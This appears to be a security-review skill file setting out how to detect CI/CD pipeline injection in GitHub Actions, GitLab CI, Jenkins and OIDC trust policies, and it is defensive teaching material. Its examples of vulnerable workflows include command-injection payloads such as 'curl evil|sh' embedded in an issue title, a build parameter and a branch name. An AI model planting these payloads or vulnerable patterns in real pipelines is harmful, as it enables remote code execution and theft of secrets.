---
name: cicd-and-pipeline-injection
description: >-
  SAST detection methodology for CI/CD and pipeline injection (CWE-94, CWE-78),
  covering GitHub Actions script injection via ${{ github.event.* }} in run:
  steps, pull_request_target checkout of untrusted PR head with secrets,
  self-hosted runner and cache poisoning, over-privileged GITHUB_TOKEN, unpinned
  third-party actions, forked-PR secret exfiltration, GitLab CI / Jenkinsfile
  injection, and insecure OIDC trust policies. Use when reviewing
  .github/workflows/*.yml, .gitlab-ci.yml, or Jenkinsfile. Writes confirmed
  findings to findings/35-cicd-and-pipeline-injection.md.
---

# CI/CD & Pipeline Injection — SAST Methodology

**Class:** CI/CD & Pipeline Injection · **CWE-94 / CWE-78** · **OWASP:** CICD-SEC (and A08 Software & Data Integrity Failures)
**Findings file:** `findings/35-cicd-and-pipeline-injection.md`

## 1. Overview

CI/CD pipelines are code that runs with credentials, on infrastructure, on every
push and pull request. Injection happens when **attacker-controllable text**
(a PR title, branch name, issue body, commit message, fork contents) is
interpolated into a shell `run:` step, or when a workflow that holds **secrets**
is tricked into executing **untrusted code** (a forked PR's head). Two failure
families dominate: (1) *expression injection* — a template like
`${{ github.event.issue.title }}` is expanded by the CI engine directly into a
shell command *before* the shell runs, so an attacker who controls the title runs
commands on the runner; (2) *privilege/trust misconfiguration* — `pull_request_target`,
over-broad `permissions:`, unpinned actions, poisoned caches/runners, or loose
OIDC trust that hands secrets or cloud roles to code the repo owner never
reviewed. The core tests: does any `${{ ... }}` field carrying attacker text
reach a `run:` step, and does any workflow with secret/write scope execute
untrusted PR code?

## 2. Where it lives

- **GitHub Actions:** `.github/workflows/*.yml`/`*.yaml`, composite/local actions
  (`action.yml`), and reusable workflows (`workflow_call`). Key knobs: `on:`
  triggers, `permissions:`, `run:` steps, `uses:` pins, `env:` mapping, `secrets:`.
- **GitLab CI:** `.gitlab-ci.yml` and `include:`d templates — `script:`,
  `before_script:`, `rules:`, protected vs unprotected variables, `CI_MERGE_REQUEST_*`.
- **Jenkins:** `Jenkinsfile` (declarative/scripted), `sh`/`bat` steps, shared
  libraries (`@Library`), `params.*`, multibranch/PR builders.
- **Others:** CircleCI (`.circleci/config.yml`), Azure Pipelines
  (`azure-pipelines.yml`), Bitbucket (`bitbucket-pipelines.yml`), Buildkite,
  Drone — same expression/trust patterns under different syntax.
- **Cloud trust:** OIDC role/trust policies (`aws-actions/configure-aws-credentials`,
  GCP/Azure federation) — the pipeline's identity boundary.

## 3. Sources (tainted input)

Anything an outside contributor can set on a fork or via an issue/PR/comment,
**expanded into the workflow**:

- `github.event.issue.title` / `.body`, `github.event.pull_request.title` /
  `.body` / `.head.ref` (**branch name**) / `.head.repo.*`, `github.event.comment.body`,
  `github.event.review.body`, `github.event.pages.*.page_name`,
  `github.event.commits.*.message` / `.author.*`, `github.head_ref`.
- GitLab: `CI_COMMIT_REF_NAME`, `CI_COMMIT_MESSAGE`, `CI_MERGE_REQUEST_TITLE`,
  `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, MR description.
- Jenkins: `env.CHANGE_TITLE`, `env.CHANGE_BRANCH`, `params.*`, PR body.
- **Second-order / indirect:** the *contents* of a checked-out fork (a malicious
  `Makefile`, `package.json` lifecycle script, test file, or a poisoned cache
  restored from an attacker-run job) executed by a later privileged step.
- **Registry/network:** a dependency or action pulled by tag that a third party
  can re-point (see the dependency-and-supply-chain skill).

## 4. Sinks (dangerous operations)

```yaml
# GitHub Actions — DANGEROUS: expression injection into a shell run: step
on:
  issues: { types: [opened] }
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"   # title = a"; curl evil|sh; #
      # ${{ }} is expanded BEFORE the shell parses it → RCE on the runner
```
```yaml
# GitHub Actions — DANGEROUS: pull_request_target runs with secrets + checks out untrusted PR head
on: pull_request_target                      # runs in BASE repo context: secrets + write token
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # untrusted attacker code
      - run: npm install && npm test          # fork's postinstall / test = code exec WITH secrets
```
```yaml
# GitHub Actions — DANGEROUS: over-privileged token + unpinned third-party action
permissions: write-all                        # not least-privilege; token can push, release, edit
jobs:
  x:
    steps:
      - uses: some-org/some-action@v1          # mutable tag — owner can move v1 to a malicious commit
      - uses: some-org/some-action@master      # branch ref — even worse
```
```yaml
# GitHub Actions — DANGEROUS: secret exfiltration surface via env + pull_request from fork
on: pull_request                              # fork PRs; normally token is read-only, but:
env:
  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}         # secret placed in env reachable by PR-controlled build
```
```yaml
# GitLab CI — DANGEROUS: unprotected variable interpolation into script
job:
  script:
    - echo "Building $CI_COMMIT_REF_NAME"      # branch name; also: eval "$CI_COMMIT_MESSAGE"
    - deploy --token $DEPLOY_TOKEN             # DEPLOY_TOKEN not marked "protected" → leaks to MR pipelines
```
```groovy
// Jenkinsfile — DANGEROUS: interpolating PR/build params into a shell step
pipeline {
  stages { stage('b') { steps {
    sh "echo Building ${env.CHANGE_TITLE}"     // Groovy interpolation into sh → command injection
    sh "git checkout ${params.BRANCH}"         // params.BRANCH = 'x; curl evil|sh'
  }}}
}
```
```hcl
# OIDC trust — DANGEROUS: wildcard sub/aud lets ANY repo assume the cloud role
Condition:
  StringLike:
    "token.actions.githubusercontent.com:sub": "repo:my-org/*"    # any repo/branch/PR in org
    # or ":sub": "*"  → any GitHub repo on earth can assume this role
```

Dangerous patterns: `${{ github.event.* }}` / branch/title/body in `run:`;
`pull_request_target` (or GitLab MR pipelines / Jenkins PR builds) checking out
and executing fork code with secrets; `permissions: write-all` or missing
`permissions:`; `uses:` on a mutable tag/branch instead of a full commit SHA;
secrets exposed to fork-triggered pipelines; self-hosted runners on public repos;
cache keys attackers can populate; OIDC `sub`/`aud` wildcards.

## 5. Sanitizers / safe patterns

**Safe:**
- **Never interpolate `${{ }}` untrusted text into a shell.** Bind it to an
  intermediate `env:` variable and reference `"$TITLE"` in the script — the shell
  receives it as data, not code:
  ```yaml
  - env: { TITLE: ${{ github.event.issue.title }} }
    run: echo "New issue: $TITLE"        # safe: passed via env, quoted
  ```
- Use `pull_request` (not `pull_request_target`) for fork CI; it runs with a
  **read-only** token and **no secrets**. If you must build untrusted code, do it
  in an isolated job with no secrets and no write permissions.
- **Least-privilege `permissions:`** at workflow or job level (`contents: read`,
  add only what's needed). Set it explicitly; don't rely on defaults.
- **Pin actions to a full 40-char commit SHA** (`uses: org/action@<sha>`), not a
  tag or branch. Enforce with Dependabot/allow-lists.
- Mark GitLab variables **protected** + **masked**; restrict them to protected
  branches. Use `rules:`/`if:` to keep secret jobs off MR pipelines from forks.
- Ephemeral, isolated runners (GitHub-hosted or auto-scaled) rather than persistent
  self-hosted runners on public repos; scope cache to trusted refs.
- Tight OIDC trust: exact `sub` (`repo:org/repo:ref:refs/heads/main`), correct
  `aud`, and least-privilege cloud role.

**Fails / not a real sanitizer:**
- Quoting the expression in the YAML (`run: echo "${{ ... }}"`) — the CI engine
  substitutes **before** quoting matters; a `"` in the payload breaks out anyway.
- Blocklisting shell metacharacters in the title/branch — incomplete and
  engine-substitution defeats it; use the `env:` indirection instead.
- `pull_request_target` "guarded" by a label/approval step that itself runs
  before or alongside the untrusted checkout, or that can be added by the PR author.
- Pinning to a tag (`@v4`) believing it is immutable — tags and even release
  assets are mutable by the action owner; only a SHA is fixed.
- `permissions: read-all` while a step still uses a separately-scoped PAT/secret
  with write access.
- OIDC restricted by `aud` but leaving `sub` as `repo:org/*` (any branch/PR/fork-merge).
- Masking a secret in logs — masking hides it from output but does not stop
  attacker code from exfiltrating it to a remote host.

## 6. Detection methodology

1. **Inventory workflows and triggers.**
   ```
   rg -n 'on:\s*$|pull_request_target|workflow_run|on:\s*\[?\s*(pull_request|issue|issues|issue_comment|discussion)' .github/workflows
   rg -l . .github/workflows .gitlab-ci.yml Jenkinsfile .circleci azure-pipelines.yml
   ```
2. **Hunt expression injection into shell steps.** Look for `${{ github.event.*`,
   title/body/branch fields, inside or adjacent to `run:`/`script:`/`sh`.
   ```
   rg -n '\$\{\{\s*github\.event\.(issue|pull_request|comment|review|discussion|commits)' .github/workflows
   rg -n '\$\{\{\s*github\.head_ref|github\.event\.pull_request\.head\.(ref|repo)' .github/workflows
   rg -n 'run:.*\$\{\{' .github/workflows
   rg -n 'CI_COMMIT_(REF_NAME|MESSAGE)|CI_MERGE_REQUEST_(TITLE|SOURCE_BRANCH)' .gitlab-ci.yml
   rg -n 'sh\s+["'\''].*\$\{(env|params)\.' Jenkinsfile
   ```
3. **Find dangerous fork execution.** `pull_request_target` (or `workflow_run`
   chained off a PR) plus a checkout of `head.sha`/`head.ref` followed by a build/
   test/install step.
   ```
   rg -n 'pull_request_target' .github/workflows
   rg -n 'ref:\s*\$\{\{\s*github\.event\.pull_request\.head' .github/workflows
   ```
4. **Audit token/permission scope.**
   ```
   rg -n 'permissions:\s*write-all|permissions:\s*write' .github/workflows
   rg -n 'GITHUB_TOKEN|secrets\.' .github/workflows       # then check each usage's permissions block
   ```
   Missing top-level `permissions:` → inherits broad default; treat as a finding.
5. **Check action/image pinning.** Flag any `uses:` on a tag or branch instead of
   a SHA.
   ```
   rg -n 'uses:\s*[^@]+@(v?\d|main|master|latest)\b' .github/workflows
   ```
6. **Runner and cache exposure.** `runs-on:` self-hosted labels on public repos;
   `actions/cache` with an attacker-influenceable key restored by a privileged job.
   ```
   rg -n 'runs-on:.*self-hosted' .github/workflows
   rg -n 'actions/cache' .github/workflows
   ```
7. **OIDC trust.** Inspect cloud IAM/trust policies for `sub`/`aud` wildcards
   (`token.actions.githubusercontent.com:sub` set to `repo:org/*` or `*`).
8. **Confirm reachability:** is the trigger fireable by an external contributor
   (public repo, forks allowed, issues open)? Pre-merge execution is the worst case.

## 7. Modern & niche variants

- **GitHub Actions script injection:** `${{ github.event.issue.title }}`,
  `pull_request.title`/`body`, `github.head_ref`, commit messages, and **branch
  names** interpolated into `run:`. The engine substitutes the raw string into the
  shell *before* execution, so any shell metacharacter in attacker text is code.
  Branch names are a classic blind spot — a fork branch literally named
  `$(curl evil|sh)` executes. Fix with `env:` indirection.
- **`pull_request_target` + untrusted checkout:** this trigger runs in the **base**
  repo with secrets and a write token, by design, to let maintainers label PRs.
  Checking out and *building/testing/installing* the PR head under it runs the
  attacker's code with full trust — the highest-severity, most common Actions RCE.
  Also reachable indirectly via `workflow_run` chained off a fork PR.
- **Self-hosted runner poisoning:** persistent self-hosted runners on public repos
  execute fork PR jobs on a machine that isn't reset between runs; the attacker
  drops a backdoor, harvests other jobs' secrets/tokens, or pivots into the
  network. Default GitHub-hosted ephemeral runners avoid this.
- **Cache poisoning:** a low-privilege job (e.g. a fork PR) writes a crafted entry
  under a cache key that a privileged branch job later restores and trusts
  (poisoned `node_modules`, compiler, or dependency), turning cache into a code-
  delivery channel across the trust boundary.
- **Over-privileged `GITHUB_TOKEN`:** `permissions: write-all` or an unset block
  gives every step push/release/issue-write scope; combined with any injection or
  compromised action, it becomes repo takeover. Least-privilege `contents: read`
  is the baseline.
- **Unpinned third-party actions (mutable tag vs SHA):** `uses: org/action@v1`
  trusts whatever commit the owner points `v1` at — a compromised or malicious
  maintainer silently ships code into your pipeline (the tj-actions/changed-files
  class). Only a full commit SHA is immutable.
- **Secret exfiltration via forked-PR workflows:** any secret placed in `env:` or
  passed to a step in a fork-triggered pipeline can be read and beaconed out by
  attacker-controlled build code. Keep secrets out of untrusted-code jobs entirely.
- **GitLab CI / Jenkinsfile injection:** GitLab `script:` interpolating
  `CI_COMMIT_REF_NAME`/`CI_MERGE_REQUEST_TITLE`, or unprotected variables leaking
  to MR pipelines; Jenkins `sh "... ${params.X}"`/`${env.CHANGE_TITLE}` Groovy
  interpolation into a shell step. Same expression-injection root cause.
- **Insecure OIDC trust (`sub`/`aud` wildcards):** a cloud role whose trust policy
  matches `repo:org/*` or `*` lets any branch, any PR merge ref, or any repository
  mint short-lived cloud credentials — a broken identity boundary that converts a
  minor pipeline foothold into cloud account access.

## 8. Common false positives

- `${{ }}` expressions carrying only **trusted** context (`github.sha`,
  `github.repository`, `runner.os`, `secrets.*` used as env, hard-coded matrix
  values) — not attacker-settable.
- Untrusted expressions bound through `env:` and referenced as quoted `"$VAR"` in
  the script (the correct mitigation).
- `pull_request_target` used **only** for labeling/commenting with no checkout of
  the PR head and no build of fork code.
- Actions already pinned to a full commit SHA, or first-party `actions/*` pinned
  to a reviewed tag by policy.
- `permissions:` explicitly scoped to exactly what the job needs.
- GitLab variables marked protected+masked and restricted to protected branches.

## 9. Severity & exploitability

Base **High**; **Critical** when it yields code execution on a runner that holds
secrets or a write token (`pull_request_target` + fork build, expression injection
in a secret-bearing workflow, poisoned self-hosted runner), when a compromised/
unpinned action or OIDC wildcard grants repo or cloud-account takeover, or when
`GITHUB_TOKEN` write scope enables supply-chain push. Pre-merge, externally
triggerable (public repo, forks allowed) reachability keeps it Critical. Lower to
**Medium/Low** when the affected workflow holds no secrets and only a read token,
input is fully trusted, or the trigger is reachable only by trusted maintainers.
See `references/severity-model.md`.

## 10. Remediation

Pass untrusted context through `env:` and reference quoted shell variables; never
interpolate `${{ }}` attacker text into `run:`. Use `pull_request` with a read-only
token for fork CI and keep secrets out of any job that runs untrusted code. Set
least-privilege `permissions:` explicitly. Pin all third-party actions to full
commit SHAs. Prefer ephemeral GitHub-hosted runners over self-hosted on public
repos, and scope caches to trusted refs. Mark CI variables protected/masked and
gate secret jobs off fork pipelines. Tighten OIDC trust to exact `sub`/`aud`
values with least-privilege cloud roles.

## 11. Output

Append each confirmed finding to **`findings/35-cicd-and-pipeline-injection.md`**
using `references/finding-template.md`. Set `Class: CI/CD & Pipeline Injection`
and `CWE: CWE-94` (code injection via expression) or `CWE-78` (command injection
into a shell step). In **Chain potential** name primitives such as *runner code
execution* (→ often terminal RCE), *secret/token exfiltration* (→ provides leaked
CI/cloud credentials that other chains consume), *repo write / supply-chain push*
(via over-privileged `GITHUB_TOKEN` or compromised action → poisons artifacts and
downstream consumers), and *cloud role assumption* (via loose OIDC → pivots into
the cloud-account attack surface). Note when it *consumes* a primitive such as an
unpinned/compromised dependency or action from the dependency-and-supply-chain
skill.

**Primitives (controlled):** provides `CODE_EXEC`,`SECRET_LEAK`; consumes none

## References
- OWASP Top 10 CI/CD Security Risks (CICD-SEC-1 … CICD-SEC-10); OWASP A08:2021
  Software & Data Integrity Failures; CWE-94; CWE-78; GitHub "Security hardening
  for GitHub Actions"; GitLab CI/CD security best practices; SLSA framework.
